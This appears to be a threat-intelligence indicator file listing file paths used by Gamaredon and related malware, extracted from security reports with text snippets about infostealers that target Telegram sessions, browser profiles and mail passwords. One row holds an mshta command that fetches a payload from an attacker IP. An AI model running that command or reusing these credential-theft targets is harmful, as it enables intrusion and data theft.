1.0.0,actor--gamaredon,artifact--sha256:d53f48b6e09def93c6592a135eaac228ad16e4afcbf41bac88d4f7dbe7b437a7,observation--sha256:8b4393ad8ce5b66f74cd8fd66d211c1750ee6b27721e34def70f4db143f928d3,file-path,"%APPDATA%\Telegram Desktop \tdata, which","%APPDATA%\Telegram Desktop \tdata, which",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:97099b965c144109b49d77db942b74e9bc5ea9d44b8aa9ded32ac0d42d493052,observation--sha256:5536bf8668dc8f3f0d6504fb12b12d5cb837294868db03367275b9f1805b5c25,file-path,%Appdata%\db.bin are created. These files contain  MD5 hashes,%Appdata%\db.bin are created. These files contain MD5 hashes,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:b5b60b2a8c7fc827312725b1aad7fddfd6fcf3ebfb4f491e6eb154267e62f6a3,observation--sha256:a75bd4ab9b57917ad50b560d839c0725b431b567ac8702d9027afaf74d4477dc,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:ef36d2e2a1830e6455e5cba0d19080b74d75ecd29669ed2ece43e0bbdd627047,observation--sha256:8385b1ebe736c46925c2b79d1b83f54aca80025df31c2e1063a6b9dc538cb3b1,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:7f9daf684bdf5c4581dfb433d6e1ae8fcd31fae749c3ff05b1af3ed98a7393c3,observation--sha256:df58698c8e7d3ddecc5cebc8efe6c06ac37be7013a7c886d7697b2999e851ca4,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:762fa82b4ff3a02df5fd86884a742cd1d85270ad396bdafdac3431bf085ec197,observation--sha256:38cab9009875d8604ca258c8d8fae7a990ef499677c230164f23d00be973e9e3,file-path,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Network\,%LOCALAPPDATA%\ Google(x86)\ Chrome\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:6c50a66d32a81e71b77176367a6e7ed88bbb2deccb4a81e7bd7d581e7ddc6d24,observation--sha256:7f90a66ad52ad92f422a889f7605509022fe60b920b5bfc79b19bb41cacb7bf7,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data \Default\,%LOCALAPPDATA%\ Google\Chrome\User Data \Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:0f8d3522b338d3ca1139b9e7109f6502f1e1b3052ef9e1f6daf7204d6b65b634,observation--sha256:eded8ecca96661e5977270b4401b139f1aad03d8db18977f3cdcd6a0c05da4ca,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:b5d0e583848151c59afdc88f5c242914c93dd3c963b72233ef5e895d73ffee76,observation--sha256:b4e1b4fba9027ff78f220f46967b210dbf1f7b1c77aa78a12310dcd15d745c30,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:3b20c6afabd02d5e17fadc39d6e4ad37f74ea0f7cfa50507167a89cb0a3ce6ba,observation--sha256:1af0d32fc716938f0df7d208bd3e2a9af89e6f51ef1eaeaae8c7692681e6c572,file-path,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Network\,%LOCALAPPDATA%\ Google\Chrome\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:fea5d5bf385f765aa661460f9a6406f40566fd3cbf349d2cecc8b26d2e1eaf6d,observation--sha256:5c7ab378f89c5dad3219ff7fa1140e29d710f94a913ddc94bbff3071fa73b5c9,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:a2d760e9a985c0effc8b26cfb7bbdec00cbc449078d53dcf496aa10ea1cbc7fb,observation--sha256:4db01242266706d78edf12d3cd20a96fdb62b206cc5feb64ab263f4cc2e64b4e,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\IndexedDB\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\IndexedDB\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:303995156d2d69979cd046ee76a6964b2c44676c9ee4adb063841cf24e0245b7,observation--sha256:51dd18689bef59f7cddbe2312e17640ffdaf82052a2a3db285ce1c336b4c80b4,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Local Storage\ leveldb\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Local Storage\ leveldb\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroGram Discovered by ESET Research in June 2023, PteroGram (SHA -1: AC17FD08A3987CC91DFD6649BA3DABE8A9671305 ) is a PowerShell infostealer targeting the Telegram Desktop application. Telegram Desktop stores its data in %APPDATA%\Telegram Desktop \tdata, which contains encrypted session data. The encryption key is derived from a passcode and salt, but if no passcode is set, an empty string is used ",
1.0.0,actor--gamaredon,artifact--sha256:2f7bf135a60477240794b6b6613fc5e2e464cf96bbc1f39100882b0e10f74554,observation--sha256:7112fa6ae8cb2b176cf329bc0e3242dec48f59b61d36f09a516cbffc7d33366a,file-path,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Network\,%LOCALAPPDATA%\ Microsoft\ Edge\User Data\ Default\Network\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:aa9cac4166638db2c8a1bca5b2fa43e21f440d52db34591724105ed896f9d938,observation--sha256:c1ddee2608c655532f83f8bf061446d7b0f4b8fafa96df6480d2b5babfaa6ee9,file-path,"%LOCALAPPDATA%\Logic\,",%LOCALAPPDATA%\Logic\,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:ad2430033b1debf49880c895fbf3b50459e68271e53f3a9506c5f66e4286a2e3,observation--sha256:535027e7e70321ac05a49b5842f5160a3557213e8122bd0834d478aea17d6962,file-path,%TEMP%\sgn to its C&C server  via HTTP POS T requests but does not delete the local copies .,%TEMP%\sgn to its C&C server via HTTP POS T requests but does not delete the local copies,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:7583ffd5e2efe2bb5c1b899f598129938e7af8fe5bb775f4f5402e446cf665b1,observation--sha256:343cd595a8b1ef97707d4ec2dcb985cf434eb07401085292037a75a966ed9f56,file-path,%Temp%\servicehubs\ and,%Temp%\servicehubs\ and,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:ab536d6bb6aa48858cfa6c629d5b56b92672f3728f3e98060b50b4d90d7cbd49,observation--sha256:37aeb2ac816491d7a88afc655e83deb493991a4493560dbf490246502d4574b6,file-path,%Temp%\servicehubs\ using HttpWebRequest,%Temp%\servicehubs\ using HttpWebRequest,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"is used when it is not possible to connect to the first address in the list. However, as mentioned before, if necessary, the link is changed to the current IP address to reconnect. FileStealer Files of this type have the extension .exe written in the C# programming lan guage using the .NET framework and are designed to collect files with the following extensions: *.doc, *.docx, *.xls, *.rtf, *.odt, *.txt, *.jpg, *.pdf. These files are collected from all active disks except CD drives. At the same",
1.0.0,actor--gamaredon,artifact--sha256:235dfb17e0c0a5e18911b4bf3dc6303b18e0998c9bfc2e8d292ddec3a4b8def4,observation--sha256:7c86260bf8f958b82c42eb20203768a42beafb543cd9a1175e3e58a068e853bf,file-path,%appdata%\Comm\Jpin and,%appdata%\Comm\Jpin and,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:af4664ddee6aaba63f6b9a5988b3a34b025928f587137c30d3e6f6a2e69b6b6f,observation--sha256:8db38b1085f60284fd2d30e3bbc3a6bf53f1138f664da71a5b880c95896822cc,file-path,%appdata%\Java\support,%appdata%\Java\support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:dee861c6820c756593916e341884fa5dab979aad9d7bdd01910140fb144b22cc,observation--sha256:4766be43212ddc24e0552cca77632e1ee10d97eca75ca464b6ec4ac196841753,file-path,%appdata%\support,%appdata%\support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:491bb915df68526c252913278160077b92775000b8832daf0ae23637c9280330,observation--sha256:5f36dd835fcfc382fad36175c4f1cd8bcb1622297ade417a96e9826a45134988,file-path,%userprofile%\AppData\Local\Java\Support,%userprofile%\AppData\Local\Java\Support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:a5287287002db5bbab7aee529389a10919448b3eae2db0c31ade94275d4163f4,observation--sha256:e0a39c53673d2eeb9bf5af71428b993d68230a31df15172ab279c29e43d248ed,file-path,%userprofile%\AppData\Local\Support,%userprofile%\AppData\Local\Support,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:e7d8a0ac3ff478056eee9a8410a46c3de9d6069f89c26217c5fb36905ef81580,observation--sha256:9a253b092a37763bbf8b2a086017433c39be974c7997b921d550aac157aca30e,file-path,"%userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform","%userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform",candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:fa743c7e194649ffc81227e1671a6500587570dcfe97ecac86cd8a27a6ae5760,observation--sha256:150b917f5a2a0de229dcb881785e968df8e946bfedcb6b0f38f321b6ac27c111,file-path,%windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu,%windir%\system32\mshta.exe http://194.180.174.203/23.01/mo/baseball.DjVu,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 9 %windir%\system32\mshta.exe http://194.180.174[.]203/23.01/mo/baseball[.]DjVu MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 System Binary Proxy Execution: Mshta T1218.005 Defense Evasion Abusing Telegram to Bypass DNS Generally in the second stage, a malicious VBScript is used then they abuse Telegram to get the real C2 IP address. For example http",
1.0.0,actor--gamaredon,artifact--sha256:10ecd0af6ca849dc3169d07610918df94cd9db8273bfe53de3e323b9e13dd5f2,observation--sha256:aeb5633f1a47b9dcf34f2b46ad25f105d0534f76bc9e668bad9c14a541c4c881,file-path,"C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be","C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be",candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, wh",
1.0.0,actor--gamaredon,artifact--sha256:d661f3e5082fc1a442c343c2594cc0986136926f011e2b2973aaa4ecd81c6f4e,observation--sha256:fc9278f54dbdf3833f20ba06e65c021b0486411a502d6fd790ee812bc3f5a9f4,file-path,C:\Users\...\AppData\Roaming\Microsoft\Шаблоны\Normal.dotm,C:\Users\...\AppData\Roaming\Microsoft\Шаблоны\Normal.dotm,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 keys with data parts are created in the registry branch HKEY_USERS\""USER""\Enviroment\userData1…userData41. During the operation of the malware, this data is concatenated and a malicious process is started on the compromised system. The malicious code is used to collect i nformation about the victim's system (computer name and serial numbers of hard drives), which is sent to the attacker's command & control server. If the connection is successful, the response will result in another malicious ",
1.0.0,actor--gamaredon,artifact--sha256:5ebc026c867b8d6fe30642d68da4aff8a68e4211b1b66d79dde0e32bc57df657,observation--sha256:07c5a488badb14597279023b522193a61dd56d3d99ac52400db771e3c576f88b,file-path,C:\Users\{username}\AppData\Local\IconsCache.db”,C:\Users\{username}\AppData\Local\IconsCache.db”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Cybergun: Technical Analysis of the Armageddon's Infostealer 11 Then it stores the filenames under “C:\Users\{username}\AppData\Local\IconsCache.db” Using this technique to understand whether it is a unique file or not. If the file is a unique file it sends all the contents of the file to the C2 server using HTTPS.,
1.0.0,actor--gamaredon,artifact--sha256:703ff9884e7470105d19161fab0c04091301f32e7657d5fb4a4f3f505a67c455,observation--sha256:4b658bbf4832d93a67ef03f2346ea4ad24e02dcc809c9b824c7567a1a09a255c,file-path,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe  as their target and a newly added,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe as their target and a newly added,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:e277020d7080c38e7a99cd013d9781cc4e1c486013af134595ea21dd86243261,observation--sha256:2a3e1d9f02199018ee2b32bed8091b04e9ce90ff14221295f2425851fb6a7211,file-path,C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX”,C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX”,candidate,,unknown,unknown,not-stated,,source--gamaredon--43ece8b760fd4f72,Gamaredon/Cybergun_Technical_Analysis_of_the_Armageddons_Infostealer.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Cybergun: Technical Analysis of the Armageddon's Infostealer 7 L”C:\\Users\\{username}\\AppData\\Local\\TEMP\\XXXXXXXXXX” Then it reads main volume’s (“C:\\”) serial number and return as a string, then it will concat the other information that taken from the PC like “ComputerName||UserName||Random12CharString||VolumeSerialNumber” Before connecting the C2 Server it first prepares the hardcoded domain name with random string subdomain.",
